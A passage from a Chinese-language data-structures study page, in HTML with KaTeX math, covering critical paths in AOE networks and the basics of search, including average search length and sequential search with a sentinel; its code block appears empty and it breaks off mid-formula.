<li>求 AOE 网中所有活动的差额 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span>，找出所有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">d() = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的活动构成关键路径</li>
</ol>
<p>对于关键路径，需要注意以下几点：</p>
<ul>
<li>关键路径上的所有活动都是关键活动，它是决定整个工程的关键因素，因此可以通过加快关键活动来缩短整个工程的工期。但也不能任意缩短关键活动，因为一旦缩短到一定的程度，该关键活动就可能会变成非关键活动</li>
<li>网中的关键路径并不唯一，且对于有几条关键路径的网，只提高一条关键路径上的关键活动速度并不能缩短整个工程的工期，只有加快那些包括在所有关键路径上的关键活动才能达到缩短工期的目的</li>
</ul>
</li>
</ol>
<h2> 查找</h2>
<h3> 查找的基本概念</h3>
<ul>
<li>
<p><strong>查找</strong></p>
<p>在数据集合中寻找满足某种条件的数据元素的过程称为查找。查找的结果一般分为两种：一是查找成功，即在数据集合中找到了满足条件的数据元素；二是查找失败。</p>
</li>
<li>
<p><strong>查找表（查找结构）</strong></p>
<p>用于查找的数据集合称为查找表，它由同一类型的数据元素（或记录）组成，可以是一个数组或链表等数据类型。对查找表经常进行的操作一般有四种：</p>
<ol>
<li>查询某个特定的数据元素是否在查找表中</li>
<li>检索满足条件的某个特定的数据元素的各种属性</li>
<li>在查找表中插入一个数据元素</li>
<li>从查找表中删除某个数据元素</li>
</ol>
</li>
<li>
<p><strong>静态查找表</strong></p>
<p>若一个查找表的操作只涉及上述操作 <code>1</code> 和 <code>2</code>，则无须动态地修改查找表，此类查找表称为静态查找表。与此对应，需要动态地插入或删除的查找表称为动态查找表。适合静态查找表的查找方法有：顺序查找、折半查找、散列查找等；适合动态查找表的查找方法有：二叉排序树的查找、散列查找等。</p>
</li>
<li>
<p><strong>关键字</strong></p>
<p>数据元素中唯一标识该元素的某个数据项的值，使用基于关键字的查找，查找结果应该是唯一的。例如：在由一个学生元素构成的数据集合中，学生元素中 “学号” 这一数据项的值唯一地标识一名学生。</p>
</li>
<li>
<p><strong>平均查找长度</strong></p>
<p>在查找过程中，一次查找的长度是指需要比较的关键字次数，而平均查找长度则是所有查找过程中进行关键字的比较次数的平均值，其数学定义为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>P</mi><mi>i</mi></msub><msub><mi>C</mi><mi>i</mi></msub></mstyle></mrow><annotation encoding="application/x-tex">ASL = \displaystyle\sum_{i=1}^n P_{i}C_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 是查找表的长度；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是查找第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个数据元素的概率，一般认为每个数据元素的查找概率相等，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">P_{i} = 1 / n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">n</span></span></span></span>；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">C_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是找到第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个数据元素所需进行的比较次数。平均查找长度是衡量查找算法效率的最主要的指标。</p>
</li>
</ul>
<h3> 顺序查找和折半查找</h3>
<h4> 顺序查找</h4>
<p>顺序查找又称 <strong>线性查找</strong>，它对顺序表和链表都是适用的。对于顺序表，可通过数组下标递增来顺序扫描每个元素；对于链表，可通过指针 <code>next</code> 来依次扫描每个元素。顺序查找通常分为对一般的无序线性表的顺序查找和对按关键字有序的线性表的顺序查找。</p>
<ol>
<li>
<p><strong>一般线性表的顺序查找</strong></p>
<p>作为一种最直观的查找方法，其基本思想是从线性表的一端开始，逐个检查关键字是否满足给定的条件。若查找到某个元素的关键字满足给定条件，则查找成功，返回该元素在线性表中的位置；若己经查找到表的另一端，但还没有查找到符合给定条件的元素，则返回查找失败的信息。下面给出其算法，主要是为了说明其中引入的 “哨兵” 的作用。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上述算法中，将 <code>ST.elem[0]</code> 称为哨兵，引入它的目的是使得 <code>Search_Seq</code> 内的循环不必判断数组是否会越界。算法从尾部开始查找，若找到 <code>ST.elem[i] == key</code> 则返回 <code>i</code> 值，查找成功。否则一定在查找到 <code>ST.elem[0] == key</code> 时跳出循环，此时返回的是 <code>0</code>，查找失败。在程序中引入 “哨兵” 并不是这个算法独有的，引入 “哨兵” 可以避免很多不必要的判断语句，从而提高程序效率。</p>
<p>对于有 <code>n</code> 个元素的表，给定值 <code>key</code> 与表中第 <code>i</code> 个元素相等，即定位第 <code>i</code> 个元素时，需进行 <code>n - i + 1</code> 次关键字的比较，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">C_{i} = n - i + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。查找成功时，顺序查找的平均长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mtext>成功</mtext></msub><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>P</mi><mrow><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mstyle></mrow><annotation encoding="application/x-tex">ASL_{\text{成功}} = \displaystyle\sum_{i=1}^n P_{n - i + 1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">成功</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></p>
<p>当每个元素的查找概率相等，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">P_{i} = 1 / n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">n</span></span></span></span> 时，有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mtext>成功</mtext></msub><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>P</mi><mrow><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mstyle></mrow><annotation encoding="application/x-tex">ASL_{\text{成功}} = \displaystyle\sum_{i=1}^n P_{n - i + 1} = \dfrac{n + 1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">成功</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>查找不成功时，与表中各关键字的比较次数显然是 <code>n + 1</code> 次，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mtext>不成功</mtext></msub><mo>=</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ASL_{\text{不成功}} = n + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">不成功</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p>
<p>通常，查找表中记录的查找概率并不相等。若能预先得知每个记录的查找概率，则应先对记录的查找概率进行排序，使表中记录按查找概率由大至小重新排列。</p>
<p>综上所述，顺序查找的 <strong>缺点是</strong> 当 <code>n</code> 较大时，平均查找长度较大，效率低；<strong>优点是</strong> 对数据元素的存储没有要求，顺序存储或链式存储皆可。对表中记录的有序性也没有要求，无论记录是否按关键字有序，均可应用。同时还需注意，对线性的链表只能进行顺序查找。</p>
</li>
<li>
<p><strong>有序表的顺序查找</strong></p>
<p>若在查找之前就已经知道表是关键字有序的，则查找失败时可以不用再比较到表的另一端就能返回查找失败的信息，从而降低顺序查找失败的平均查找长度。</p>
<p>假设表 <code>L</code> 是按关键字从小到大排列的，查找的顺序是从前往后，待查找元素的关键字为 <code>key</code>，当查找到第 <code>i</code> 个元素时，发现第 <code>i</code> 个元素对应的关键字小于 <code>key</code>，但第 <code>i + 1</code> 个元素对应的关键字大于 <code>key</code>，这时就可返回查找失败的信息，因为第 <code>i</code> 个元素之后的元素的关键字均大于 <code>key</code>，所以表中不存在关键字为 <code>key</code> 的元素。</p>
<p>在有序线性表的顺序查找中，查找成功的平均查找长度和一般线性表的顺序查找一样。查找失败时，查找指针一定走到了某个失败结点。这些失败结点是虚构的空结点，实际上是不存在的，所以到达失败结点时所查找的长度等于它上面的一个圆形结点的所在层数。查找不成功的平均查找长度在相等查找概率的情形下为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mtext>不成功</mtext></msub><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>q</mi><mi>j</mi></msub><mo stretchy="false">(</mo><msub><mi>l</mi><mi>j</mi></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mo>…</mo><mi>n</mi><mo>+</mo><mi>n</mi></mrow><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mo>=</mo><mfrac><mi>n</mi><mn>2</mn></mfrac><mo>+</mo><mfrac><mi>n</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">ASL_{\text{不成功}} = \displaystyle\sum_{j=1}^n q_{j}(l_{j} - 1) = \dfrac{1 + 2 + \dotsc n + n}{n + 1} = \dfrac{n}{2} + \dfrac{n}{n + 1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">不成功</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0652em;vertical-align:-1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0908em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span 